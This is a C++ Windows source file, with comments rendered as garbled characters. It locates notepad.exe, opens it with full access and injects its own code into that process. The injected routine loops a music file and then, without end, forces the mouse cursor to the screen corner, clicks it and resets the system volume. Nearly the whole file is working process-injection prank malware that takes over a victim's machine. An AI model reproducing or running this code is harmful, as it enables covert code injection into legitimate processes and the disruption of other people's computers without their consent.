#include "stdafx.h"
#include <array>
#include <sstream>
#include <windows.h> 
#include <mmdeviceapi.h> 
#include <endpointvolume.h>
#include <audioclient.h>
#include <SDKDDKVer.h>
#include "InjectExe.h"
#pragma comment (lib, "winmm.lib")
#pragma data_seg("MySec")
using namespace std;

DWORD GetProcessID(char* FileName);
int RemoteMain();
bool SetVolum(int volume);

/*
    ��ȡӦ�ó����PIDֵ
*/
DWORD GetProcessID(char* FileName)
{
	HANDLE hProcess;
	PROCESSENTRY32 pe;
	BOOL bRet;
	hProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bRet = ::Process32First(hProcess, &pe);  
	while (bRet)
	{
		if (strcmp(FileName, pe.szExeFile) == 0)
			return pe.th32ProcessID;
		else
			bRet = ::Process32Next(hProcess, &pe);
	}
	return 9999;
}
/*
    ע�����֮��Ҫ��������
*/
int RemoteMain()
{
    free(malloc(1));
    mciSendString(_T("open hsgjDJ.wma alias music"), NULL, 0, NULL);	//��wam��Ƶ�ļ�����Ϊ����ע�룬��ȷ����ǰĿ¼�����Ա����Ǿ���·��
    mciSendString(_T("play music repeat"), NULL, 0, NULL);	//ѭ������
    while (true)    //��ѭ�����й��ܺ���
    {
        SetCursorPos(0, 0);   //����������0,0����
        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); //������
        SetVolum(20);         //���õ�������Ϊ100
    }
    return 0;
}

/*
    ����ϵͳ����(������Χ:0~100,����Ϊ0ʱ����)
*/
bool SetVolum(int volume)
{
    bool ret = false;
    HRESULT hr;
    IMMDeviceEnumerator* pDeviceEnumerator = 0;
    IMMDevice* pDevice = 0;
    IAudioEndpointVolume* pAudioEndpointVolume = 0;
    IAudioClient* pAudioClient = 0;

    try {
        hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pDeviceEnumerator);
        if (FAILED(hr)) throw "CoCreateInstance";
        hr = pDeviceEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
        if (FAILED(hr)) throw "GetDefaultAudioEndpoint";
        hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pAudioEndpointVolume);
        if (FAILED(hr)) throw "pDevice->Active";
        hr = pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pAudioClient);
        if (FAILED(hr)) throw "pDevice->Active";

        float fVolume;
        fVolume = volume / 100.0f;
        hr = pAudioEndpointVolume->SetMasterVolumeLevelScalar(fVolume, &GUID_NULL);
        if (FAILED(hr)) throw "SetMasterVolumeLevelScalar";

        pAudioClient->Release();
        pAudioEndpointVolume->Release();
        pDevice->Release();
        pDeviceEnumerator->Release();

        ret = true;
    }
    catch (...) {
        if (pAudioClient) pAudioClient->Release();
        if (pAudioEndpointVolume) pAudioEndpointVolume->Release();
        if (pDevice) pDevice->Release();
        if (pDeviceEnumerator) pDeviceEnumerator->Release();
        throw;
    }
    return ret;
}

int main()
{
	// ��ȡָ��exe�����PIDֵ
	char name[] = "notepad.exe";
	DWORD pid = GetProcessID(name); //��ȡӦ�ó����PIDֵ
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);   //��ָ��PID���̶��󣬲��һ�����Ľ��̾��

    /*
        ���������Խ��иĽ�Ϊָ������PIDע�룬����GetProcessID()����
    */

	// �õ��������ע�벢ִ��RemoteMain()����
	LPVOID remoteImageBase = InjectExe(process, RemoteMain);

	return 0;
}

